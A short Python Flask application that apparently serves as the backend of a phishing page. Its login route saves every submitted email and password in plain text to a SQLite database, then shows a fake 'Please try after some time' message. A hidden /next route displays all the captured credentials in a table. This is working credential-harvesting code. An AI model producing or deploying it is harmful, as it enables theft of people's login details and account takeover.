from flask import Flask, request, redirect, render_template, flash, url_for
import sqlite3

app = Flask(__name__)
app.secret_key = 'your_secret_key'  # For flashing messages

# Initialize SQLite DB
def init_db():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()

    # Create users table if it doesn't exist
    c.execute('''
        CREATE TABLE IF NOT EXISTS users (
            id INTEGER PRIMARY KEY AUTOINCREMENT,
            email TEXT NOT NULL,
            password TEXT NOT NULL
        )
    ''')
    conn.commit()
    conn.close()

# Route for rendering the login page (index)
@app.route('/')
def index():
    return render_template('index.html')

# Route for handling login
@app.route('/login', methods=['POST'])
def login():
    # Get the form data
    email = request.form.get('email')
    password = request.form.get('password')

    # Store data in the SQLite database
    conn = sqlite3.connect('users.db')
    c = conn.cursor()

    # Insert the user's data into the database
    c.execute('INSERT INTO users (email, password) VALUES (?, ?)', (email, password))

    conn.commit()
    conn.close()

    # Flash a success message
    flash('Please try after some time')
    
    # Reload the index page after login
    return redirect(url_for('index'))

# Route to display the last entered data (only accessible manually)
# Route to display all user data in a table
@app.route('/next')
def next_page():
    conn = sqlite3.connect('users.db')
    c = conn.cursor()

    # Retrieve all users from the database
    c.execute('SELECT id, email, password FROM users')
    users = c.fetchall()  # Fetch all user records

    conn.close()

    # Pass the user data to the template for rendering
    return render_template('next.html', users=[{'id': user[0], 'email': user[1], 'password': user[2]} for user in users])

if __name__ == '__main__':
    # Initialize the database
    init_db()
    # Start the Flask app
    app.run(debug=True)
